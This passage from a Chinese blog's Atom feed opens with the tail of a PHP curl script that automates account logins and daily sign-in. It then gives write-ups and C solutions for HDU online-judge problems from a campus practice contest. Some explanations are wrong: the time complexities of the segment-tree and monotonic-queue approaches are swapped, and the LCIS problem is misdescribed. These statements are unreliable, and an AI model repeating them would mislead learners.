</span><span class='line'>  <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$Url</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">//发送首页请求</span>
</span><span class='line'>  <span class="nv">$res</span> <span class="o">=</span> <span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">//读取t_sign_auth值</span>
</span><span class='line'>  <span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/^Set-Cookie: t_sign_auth=(.*?);/m&#39;</span><span class="p">,</span> <span class="nv">$res</span><span class="p">,</span> <span class="nv">$t_sign</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">//判断登陆是否成功</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$t_sign</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">echo</span> <span class="s2">&quot;[Error]: get t_sign_auth is false(</span><span class="si">$email</span><span class="s2">)&quot;</span><span class="p">;</span>
</span><span class='line'>      <span class="k">continue</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">//拼接cookie数据</span>
</span><span class='line'>  <span class="nv">$cookie</span> <span class="o">=</span> <span class="nv">$cookie</span> <span class="o">.</span> <span class="s2">&quot;;t_sign_auth=</span><span class="si">$t_sign[1]</span><span class="s2">;index_logined_hotmusic_tab=1&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/*  * *********************第三次发送模拟数据包请求*************************** */</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">//设置cookie数据</span>
</span><span class='line'>  <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_COOKIE</span><span class="p">,</span> <span class="nv">$cookie</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">//设置请求地址   </span>
</span><span class='line'>  <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$signinUrl</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">//发送首页请求</span>
</span><span class='line'>  <span class="nv">$res</span> <span class="o">=</span> <span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">echo</span> <span class="s2">&quot;user:</span><span class="si">$email</span><span class="s2"> is ok!&lt;br/&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">//关闭连接</span>
</span><span class='line'>  <span class="nb">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>最后的最后，有一个需要强调的是:</p>

<h3>请不要转载，不要转载，不要转载，如果转载，请不要注明出处 -。-|||</h3>

<p>好了，全文完！</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[2012 GDIT校内模拟赛(续)]]></title>
    <link href="http://sunkid.me/blog/2012/04/09/2012-gdit-contest-2/"/>
    <updated>2012-04-09T19:19:00+08:00</updated>
    <id>http://sunkid.me/blog/2012/04/09/2012-gdit-contest-2</id>
    <content type="html"><![CDATA[<p>别的话我就不多说了，接着继续昨晚没写完的题解吧。</p>

<h3>Problem 1006</h3>

<p>题目地址： <a href="http://acm.hdu.edu.cn/showproblem.php?pid=4193">Non-negative Partial Sums</a></p>

<br/>


<h4>题意：</h4>

<p>给你一个数组，例:a[0],a[1],&#8230;,a[n-1]。要你找出数列a[k],a[k+1],&#8230;,a[n-1],a[0],a[1],&#8230;,a[k]
使这个数列的任意前k项和都大于-1。问有多少个这样的数列。</p>

<br/>


<h4>题解：</h4>

<p>我们注意下这道题的测试数据，N的范围不是很大( N&lt;10<sup>6</sup> ),所以这道题存在较多的解题方法。</p>

<p>比较常用的有下面2种解法：</p>

<p>一是采用线段树求解，这算法比较高效，时间复杂度为O(N)。
没看过线段树的童鞋可以参考下这篇文章 <a href="http://hi.baidu.com/alpc62/blog/item/469edeca0043e382c8176875.html">线段树入门</a></p>

<p>用线段数最主要的目的是为了减少计算区间的遍历时间.</p>

<p>还有一直方法是采用单调队列的方法。百度上搜索到的多是这种方法的题解，用单调队列的时间复杂度为O(N*LogN).</p>

<!--more-->


<h3>Problem 1007</h3>

<p>题目地址： <a href="http://acm.hdu.edu.cn/showproblem.php?pid=4144">Bacon&#8217;s Cipher</a></p>

<br/>


<h4>题意：</h4>

<p>加密一段字符串，加密方法是这样的，我们先把字符A看为0，B为1，C为2，⋯⋯ 等等。现在，
我们就可以将字符串的每人字母用数字来代替。接着，我们将每个代表字母的数字都转成
5位的2进制表示。例如C表示为2代替，转成二进制表示为‘00010’。
然后，我们用随机的大写字母表示0位，用随机的数字表示1位，则’00010‘（’c&#8217;）可以转换成
ABC1D 或 XJG5P</p>

<p>现在，给出一个加密后的密文，要求你将其解密为明文。</p>

<br/>


<h4>题解：</h4>

<p>很简单的题目，只要把题意看懂，我相信大家都能完成。</p>

<p>这道题没啥算法可言，只要先把密文按每5位转换成二进制数，再转换为10进制数，就可以求出
明文了。</p>

<h3>Problem 1008</h3>

<p>题目地址： <a href="http://acm.hdu.edu.cn/showproblem.php?pid=4143">A Simple Problem</a></p>

<br/>


<h4>题意：</h4>

<p>给你一个正整数n，要求你找出一个最小的正整数x ，同时存在一个正整数y可以满足公式：
y<sup>2</sup> = n + x<sup>2</sup></p>

<br/>


<h4>题解：</h4>

<p>这道题目名叫“一道简单的题目”，但看似简单的题目往往就不简单。。看清楚题意后可以很快
的发现是道数学题，这次一队在最后的时间秒杀了这道题，这位同学的数学应该还是挺不错的。</p>

<p>解题思路大概如下：</p>

<p>先将公式y<sup>2</sup> = n + x<sup>2</sup> 分解为 (y-x)(y+x)=n.然后假设y - x = a,y + x = b. 接着就可以去
遍历a，时间复杂度为O（TN），可是这种做法会超时。n的范围是（n &lt; 10<sup>9</sup> ）,题目没给出T的范围，
但T可以猜出T的范围不会小，因为假如T的时间复杂度可以忽略，那这道题目的T 就没有存在意义了。
所以要找出其他办法。</p>

<p>其实，我们通过均值不等式可以很大程度减少遍历a的次数。首先，对n进行开平方,接着向下开始找因子
a,找到的第一个a，b就是答案。。</p>

<p>详细代码可以看这里：<a href="http://www.linuxso.com/linuxbiancheng/13773.html">2011百校联动“菜鸟杯”程序设计公开赛</a></p>

<h3>Problem 1009</h3>

<p>题目地址： <a href="http://acm.hdu.edu.cn/showproblem.php?pid=3308">LCIS</a></p>

<br/>


<h4>题意：</h4>

<p>给你一个数列。然后进行询问：</p>

<p>U A B：表示用B代替数列中A位置的数（数列从0开始记起）</p>

<p>Q A B：表示输出A到B之间的最长公共上升子序列</p>

<h4>题解：</h4>

<p>经典的题目，LCIS，二年级的同学应该看过，没做出来可能是时间紧或者赛前资料没准备充足。
资料准备足的话直接抄经典代码就能A过这道题了 =。=</p>

<p>好吧，我有点懒，就直接贴别人写得比较好的详细解看吧（当然，我写的话也不可能写得有人家好）</p>

<p><a href="http://wenku.baidu.com/view/3e78f223aaea998fcc220ea0.html">最长公共上升子序列的O（ n<sup>2</sup> ）算法</a></p>

<h3>Problem 1010</h3>

<p>题目地址： <a href="http://acm.hdu.edu.cn/showproblem.php?pid=1008">Elevator</a></p>

<p>这道题基本所有人都做出来了，大水题，就不费时间写题解了，给个代码凑合下 :)</p>

<figure class='code'><figcaption><span>Elevator</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">n</span><span class="p">;</span>
</span><span class='line'>    <span class="k">while</span><span class="p">(</span><span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">n</span><span class="p">)</span><span class="o">!=</span><span class="n">EOF</span><span class="o">&amp;&amp;</span><span class="n">n</span><span class="o">!=</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="kt">int</span> <span class="n">now</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="n">next</span><span class="p">,</span><span class="n">time</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span><span class='line'>        <span class="k">while</span><span class="p">(</span><span class="n">n</span><span class="o">--</span><span class="p">)</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">next</span><span class="p">);</span>
</span><span class='line'>            <span class="k">if</span><span class="p">(</span><span class="n">next</span><span class="o">&gt;=</span><span class="n">now</span><span class="p">)</span> <span class="n">time</span><span class="o">+=</span><span class="p">(</span><span class="n">next</span><span class="o">-</span><span class="n">now</span><span class="p">)</span><span class="o">*</span><span class="mi">6</span><span class="o">+</span><span class="mi">5</span><span class="p">;</span>
</span><span class='line'>            <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">next</span><span class="o">&lt;</span><span class="n">now</span><span class="p">)</span> <span class="n">time</span><span class="o">+=</span><span class="p">(</span><span class="n">now</span><span class="o">-</span><span class="n">next</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="mi">5</span><span class="p">;</span>
</span><span class='line'>            <span class="n">now</span><span class="o">=</span><span class="n">next</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">time</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Problem 1011</h3>

<p>题目地址： <a href="http://acm.hdu.edu.cn/showproblem.php?pid=1532">Drainage Ditches</a></p>

<p>图论中的经典网络流题目，这也是我学网络流的时候完成的第一道题。原题是USACO的题目。。
按照算法导论的伪代码写就能A过这道题了，也没啥特别要注意的地方。</p>

<br />


<h4>刚刚写好后打了常LOL，又10点半了，又该洗洗睡了，安~ 各位ACMer</h4>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[2012 GDIT校内模拟赛]]></title>
    <link href="http://sunkid.me/blog/2012/04/08/2012-gdit-contest/"/>
    <updated>2012-04-08T21:09:00+08:00</updated>
    <id>http://sunkid.me/blog/2012/04/08/2012-gdit-contest</id>
    <content type="html"><![CDATA[<p>今年的广东省赛提前了一个月在华南农业大学进行，珠海市市赛延迟到5月，不知道今年acm协会是
怎么安排的-。-</p>

<p>说回来，前几天老师说弄场校内模拟赛测试下，为了公平，这次选题就由不参加的我挑选了。
比赛题目全部是由杭电的题库选取的，总体说题目还是偏简单的，水分偏多，这是考虑到大一
的学生接触的时间比较短，所以这套题目应该还算合适的。</p>

<p>下面是这次模拟赛的题解:</p>

<h3>Problem 1001</h3>

<p>题目地址：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=1003">Max Sum</a></p>

<p>这是道经典的动态规划题目，我最初学动态规划完成的就是这道题了，题意是求最大连续子序列和。</p>

<p>状态转移方程是：DP[i] = max{DP[i-1]+data[i],0},最后,DP数组中最大的值就是答案了。</p>

<p>代码：</p>

<figure class='code'><figcaption><span>Problem 1001</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include&lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include&lt;malloc.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">short</span> <span class="kt">int</span> <span class="n">a</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">t</span><span class="p">,</span><span class="n">i</span><span class="p">,</span><span class="n">x</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span><span class="n">n</span><span class="p">,</span><span class="n">max</span><span class="p">,</span><span class="n">sum</span><span class="p">,</span><span class="n">right</span><span class="p">,</span><span class="n">letf</span><span class="p">,</span><span class="n">b</span><span class="p">;</span>
</span><span class='line'>    <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">t</span><span class="p">);</span>
</span><span class='line'>    <span class="k">while</span><span class="p">(</span><span class="n">t</span><span class="o">--</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">n</span><span class="p">);</span>
</span><span class='line'>        <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="n">b</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="n">max</span><span class="o">=-</span><span class="mi">1001</span><span class="p">,</span><span class="n">sum</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">n</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">a</span><span class="p">);</span>
</span><span class='line'>            <span class="k">if</span><span class="p">(</span><span class="n">max</span><span class="o">&lt;</span><span class="n">sum</span><span class="o">+</span><span class="n">a</span><span class="p">)</span>
</span><span class='line'>            <span class="p">{</span>
</span><span class='line'>                <span class="n">max</span><span class="o">=</span><span class="n">sum</span><span class="o">+</span><span class="n">a</span><span class="p">;</span>
</span><span class='line'>                <span class="n">letf</span><span class="o">=</span><span class="n">b</span><span class="p">;</span>
</span><span class='line'>                <span class="n">right</span><span class="o">=</span><span class="n">i</span><span class="p">;</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>            <span class="n">sum</span><span class="o">+=</span><span class="n">a</span><span class="p">;</span>
</span><span class='line'>            <span class="k">if</span><span class="p">(</span><span class="n">sum</span><span class="o">&lt;</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'>            <span class="p">{</span>
</span><span class='line'>                <span class="n">b</span><span class="o">=</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span>
</span><span class='line'>                <span class="n">sum</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="n">t</span><span class="o">?</span><span class="s">&quot;Case %d:</span><span class="se">\n</span><span class="s">%d %d %d</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="o">:</span><span class="s">&quot;Case %d:</span><span class="se">\n</span><span class="s">%d %d %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">x</span><span class="o">++</span><span class="p">,</span><span class="n">max</span><span class="p">,</span><span class="n">letf</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="n">right</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<!--more-->


<h3>Problem 1002</h3>

<p>题目地址：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=1021">Fibonacci Again</a></p>

<p>这题第一眼看上去很简单，然后发现似乎不对，再想一想发现真的灰常简单，囧~~</p>

<p>不解释，看代码：</p>

<figure class='code'><figcaption><span>Fibonacci Again</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">n</span><span class="p">;</span>
</span><span class='line'>    <span class="k">while</span><span class="p">(</span><span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">n</span><span class="p">)</span><span class="o">!=</span><span class="n">EOF</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="k">if</span><span class="p">((</span><span class="n">n</span><span class="o">-</span><span class="mi">2</span><span class="p">)</span><span class="o">%</span><span class="mi">4</span><span class="o">==</span><span class="mi">0</span><span class="p">)</span> <span class="n">printf</span><span class="p">(</span><span class="s">&quot;yes</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">else</span> <span class="n">printf</span><span class="p">(</span><span class="s">&quot;no</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Problem 1003</h3>

<p>题目地址：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=1005">Number Sequence</a></p>

<p>基础题,字符串匹配,KMP算法. 没做出来的同学可以看看: <a href="http://www.matrix67.com/blog/archives/115">KMP算法详解</a></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include&lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#define MAXN 10001</span>
</span><span class='line'><span class="cp">#define _match(a,b) ((a)==(b))</span>
</span><span class='line'>
</span><span class='line'><span class="k">typedef</span> <span class="kt">int</span> <span class="n">elem_t</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">pat_match</span><span class="p">(</span><span class="kt">int</span> <span class="n">ls</span><span class="p">,</span><span class="n">elem_t</span><span class="o">*</span> <span class="n">str</span><span class="p">,</span><span class="kt">int</span> <span class="n">lp</span><span class="p">,</span><span class="n">elem_t</span><span class="o">*</span> <span class="n">pat</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">fail</span><span class="p">[</span><span class="n">MAXN</span><span class="p">]</span><span class="o">=</span><span class="p">{</span><span class="o">-</span><span class="mi">1</span><span class="p">},</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="n">j</span><span class="p">;</span>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="n">j</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="n">j</span><span class="o">&lt;</span><span class="n">lp</span><span class="p">;</span><span class="n">j</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="k">for</span> <span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="n">fail</span><span class="p">[</span><span class="n">j</span><span class="o">-</span><span class="mi">1</span><span class="p">];</span><span class="n">i</span><span class="o">&gt;=</span><span class="mi">0</span><span class="o">&amp;&amp;!</span><span class="n">_match</span><span class="p">(</span><span class="n">pat</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">],</span><span class="n">pat</span><span class="p">[</span><span class="n">j</span><span class="p">]);</span><span class="n">i</span><span class="o">=</span><span class="n">fail</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span><span class='line'>        <span class="n">fail</span><span class="p">[</span><span class="n">j</span><span class="p">]</span><span class="o">=</span><span class="p">(</span><span class="n">_match</span><span class="p">(</span><span class="n">pat</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">],</span><span class="n">pat</span><span class="p">[</span><span class="n">j</span><span class="p">])</span><span class="o">?</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="o">:-</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">ls</span><span class="o">&amp;&amp;</span><span class="n">j</span><span class="o">&lt;</span><span class="n">lp</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">_match</span><span class="p">(</span><span class="n">str</span><span class="p">[</span><span class="n">i</span><span class="p">],</span><span class="n">pat</span><span class="p">[</span><span class="n">j</span><span class="p">]))</span>
</span><span class='line'>    <span class="n">j</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">j</span><span class="p">)</span>
</span><span class='line'>    <span class="n">j</span><span class="o">=</span><span class="n">fail</span><span class="p">[</span><span class="n">j</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="n">i</span><span class="o">--</span><span class="p">;</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">j</span><span class="o">==</span><span class="n">lp</span><span class="o">?</span><span class="p">(</span><span class="n">i</span><span class="o">-</span><span class="n">lp</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="o">:-</span><span class="mi">1</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="kt">int</span> <span class="n">str</span><span class="p">[</span><span class="mi">1000000</span><span class="p">],</span><span class="n">str1</span><span class="p">[</span><span class="mi">10001</span><span class="p">];</span>
</span><span class='line'><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">n</span><span class="p">,</span><span class="n">m</span><span class="p">,</span><span class="n">t</span><span class="p">,</span><span class="n">i</span><span class="p">;</span>
</span><span class='line'>    <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">t</span><span class="p">);</span>
</span><span class='line'>    <span class="k">while</span><span class="p">(</span><span class="n">t</span><span class="o">--</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%d%d&quot;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">n</span><span class="p">,</span><span class="o">&amp;</span><span class="n">m</span><span class="p">);</span>
</span><span class='line'>        <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">n</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>            <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">str</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span><span class='line'>        <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">m</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>            <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">str1</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">pat_match</span><span class="p">(</span><span class="n">n</span><span class="p">,</span><span class="n">str</span><span class="p">,</span><span class="n">m</span><span class="p">,</span><span class="n">str1</span><span class="p">));</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Problem 1004</h3>

<p>题目地址：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=1009">FatMouse&#8217; Trade</a></p>

<br/>


<h4>题意:</h4>

<p>老鼠有M磅猫食。有N个房间，每个房间前有一只猫，房间里有老鼠最喜欢的食品JavaBean,J[i]。
若要引开猫，必须付出相应的猫食F[i]。当然这只老鼠没必要每次都付出所有的F[i]。若它付出
F[i]的a%，则得到J[i]的a%。求老鼠能吃到的做多的JavaBean</p>

<br/>


<h4>解题思路：</h4>

<p>可以用动态规划解决，用贪心思路也一样可以，而且贪心的思路比较容易想到，大概是这样的：</p>

<p>我们将J[i]/F[i],可以得到这一房间每1猫食可以换取到多少JavaBean。当然，老鼠要优先换取
j[i]/F[i]比较大的房间的JavaBean。</p>

<h4>代码：</h4>

<figure class='code'><figcaption><span>FatMouse&#8217; Trade</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
